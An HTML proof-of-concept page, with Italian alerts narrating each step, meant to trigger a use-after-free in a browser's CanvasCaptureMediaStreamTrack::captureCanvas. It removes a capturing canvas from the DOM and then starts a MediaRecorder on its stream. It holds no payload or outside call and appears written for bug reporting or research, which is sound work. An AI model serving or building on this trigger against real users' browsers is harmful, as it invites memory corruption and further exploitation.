<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8" />
    <title>PoC UAF in CanvasCaptureMediaStreamTrack::captureCanvas</title>
    <style>
        canvas {
            border: 2px solid #444;
            margin-bottom: 20px;
        }
        button {
            padding: 8px 16px;
            font-size: 16px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <h2>PoC UAF in <code>CanvasCaptureMediaStreamTrack::captureCanvas()</code></h2>

    <button id="startButton">Avvia PoC</button>
    <canvas id="myCanvas" width="320" height="180"></canvas>
    <video id="video" autoplay muted playsinline style="display:none;"></video>

    <script>
        const startBtn = document.getElementById("startButton");
        const canvas   = document.getElementById("myCanvas");
        const videoEl  = document.getElementById("video");

        startBtn.addEventListener("click", () => {
            startBtn.disabled = true;
            alert("1) Disegno un rettangolo sul canvas...");
            const ctx = canvas.getContext("2d");
            ctx.fillStyle = "#44a";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            alert("2) Chiamo canvas.captureStream()...");
            let stream;
            try {
                stream = canvas.captureStream(0);
            } catch (e) {
                alert(`❌ captureStream() fallito: ${e}`);
                return;
            }
            alert("⮕ MediaStream ottenuto.");
            alert("3) Collego il MediaStream al <video>...");
            videoEl.srcObject = stream;
            videoEl.addEventListener("loadeddata", onVideoLoaded);
        });

        function onVideoLoaded() {
            alert("4) loadeddata ricevuto.");
            videoEl.removeEventListener("loadeddata", onVideoLoaded);
            alert("5) Rimuovo <canvas> dal DOM...");
            canvas.parentNode.removeChild(canvas);
            setTimeout(triggerFrameCapture, 50);
        }

        function triggerFrameCapture() {
            alert("6) Attivo MediaRecorder...");
            try {
                const recorder = new MediaRecorder(videoEl.srcObject);
                recorder.ondataavailable = () => {
                    alert("   • ondataavailable ricevuto.");
                };
                recorder.onerror = e => {
                    alert(`   ❌ MediaRecorder errore: ${e.error.name}`);
                };
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    alert("   • Recorder stoppato.");
                }, 100);
            } catch (e) {
                alert(`   ❌ Errore MediaRecorder: ${e.name}`);
            }
            alert("Fine test.");
        }
    </script>
</body>
</html>
